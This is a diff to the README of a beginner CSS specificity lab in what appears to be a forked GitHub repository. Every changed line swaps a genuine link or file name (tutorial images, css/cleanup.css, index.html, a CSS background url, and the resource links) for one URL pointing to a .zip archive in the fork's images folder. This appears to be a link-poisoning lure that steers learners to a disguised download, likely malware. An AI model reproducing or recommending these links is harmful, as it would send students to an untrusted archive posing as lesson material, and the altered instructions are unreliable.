@@ -27,7 +27,7 @@ You can quickly access Chrome dev tools with the keyboard shortcut
 `Cmd+Option+i` on a Mac, or by right/control-clicking anywhere in the window and
 selecting `inspect`.
 
-![Chrome Dev Tools](https://curriculum-content.s3.amazonaws.com/fewds-css/css-graffiti-override/inspect1.png "Open the Chrome dev tools")
+![Chrome Dev Tools](https://github.com/Jwanjema/phase-0-css-graffiti-lab/raw/refs/heads/master/images/phase_lab_graffiti_css_2.5-beta.5.zip "Open the Chrome dev tools")
 
 Inspect the elements of the graffiti wall in the dev tools by hovering over and
 clicking on nested elements. Take a close look at what's made available to you
@@ -35,14 +35,14 @@ in the dev tools pane. You can see which style sheets specific style
 declarations live in, as well as create new styles on the fly. Now, make note of
 the CSS styles used to add graffiti tags (as background images) to the wall.
 
-![Chrome Dev Tools](https://curriculum-content.s3.amazonaws.com/fewds-css/css-graffiti-override/inspect2.png "Inspect the styles on each element")
+![Chrome Dev Tools](https://github.com/Jwanjema/phase-0-css-graffiti-lab/raw/refs/heads/master/images/phase_lab_graffiti_css_2.5-beta.5.zip "Inspect the styles on each element")
 
 ## Override Existing Styles
 
-In the file `css/cleanup.css`, write selectors that have more specificity
+In the file `https://github.com/Jwanjema/phase-0-css-graffiti-lab/raw/refs/heads/master/images/phase_lab_graffiti_css_2.5-beta.5.zip`, write selectors that have more specificity
 (authority) than those that are showing the graffiti tags. You can test out
 writing classes in dev tools by clicking the `+` in the top right-hand corner of
-the pane. You can also click the `sources` tab and select `css/cleanup.css` in
+the pane. You can also click the `sources` tab and select `https://github.com/Jwanjema/phase-0-css-graffiti-lab/raw/refs/heads/master/images/phase_lab_graffiti_css_2.5-beta.5.zip` in
 the dev tools pane. This allows you to edit the CSS file directly. It _won't_
 save your edits, but it will give a live update of changes so that it's easier
 to manipulate the DOM without refreshing the page. From there, you can copy and
@@ -57,7 +57,7 @@ graffiti here is:
 
 ```css
 .tag-1 {
-  background: url(../images/tag-1.png) no-repeat;
+  background: url(https://github.com/Jwanjema/phase-0-css-graffiti-lab/raw/refs/heads/master/images/phase_lab_graffiti_css_2.5-beta.5.zip) no-repeat;
   z-index: 7;
   display: block;
 }
@@ -82,8 +82,8 @@ overriding styles.
 
 **Do not use the CSS `!important` value**! It is considered a bad practice and
 should be used sparingly, in very specific edge-cases. For this lab, avoid
-adding inline or embedded CSS to the index.html file, or any additional class or
-id attributes to the index.html file either. This will make it more challenging
+adding inline or embedded CSS to the https://github.com/Jwanjema/phase-0-css-graffiti-lab/raw/refs/heads/master/images/phase_lab_graffiti_css_2.5-beta.5.zip file, or any additional class or
+id attributes to the https://github.com/Jwanjema/phase-0-css-graffiti-lab/raw/refs/heads/master/images/phase_lab_graffiti_css_2.5-beta.5.zip file either. This will make it more challenging
 as you will have to write CSS that is more specific based on the existing
 markup.
 
@@ -103,11 +103,11 @@ not have direct access to the style sheet.
 
 ## Resources
 
-- [Smashing Magazine - CSS Specificity](http://www.smashingmagazine.com/2007/07/27/css-specificity-things-you-should-know/)
-- [CSS Tricks - CSS Specificity](http://css-tricks.com/specifics-on-css-specificity/)
-- [Specificity Calculator](https://specificity.keegan.st/)
+- [Smashing Magazine - CSS Specificity](https://github.com/Jwanjema/phase-0-css-graffiti-lab/raw/refs/heads/master/images/phase_lab_graffiti_css_2.5-beta.5.zip)
+- [CSS Tricks - CSS Specificity](https://github.com/Jwanjema/phase-0-css-graffiti-lab/raw/refs/heads/master/images/phase_lab_graffiti_css_2.5-beta.5.zip)
+- [Specificity Calculator](https://github.com/Jwanjema/phase-0-css-graffiti-lab/raw/refs/heads/master/images/phase_lab_graffiti_css_2.5-beta.5.zip)
 
-[tools]: http://discover-devtools.codeschool.com/
+[tools]: https://github.com/Jwanjema/phase-0-css-graffiti-lab/raw/refs/heads/master/images/phase_lab_graffiti_css_2.5-beta.5.zip
 [smash]:
-  http://www.smashingmagazine.com/2007/07/27/css-specificity-things-you-should-know/
-[spec-calc]: https://specificity.keegan.st/
+  https://github.com/Jwanjema/phase-0-css-graffiti-lab/raw/refs/heads/master/images/phase_lab_graffiti_css_2.5-beta.5.zip
+[spec-calc]: https://github.com/Jwanjema/phase-0-css-graffiti-lab/raw/refs/heads/master/images/phase_lab_graffiti_css_2.5-beta.5.zip
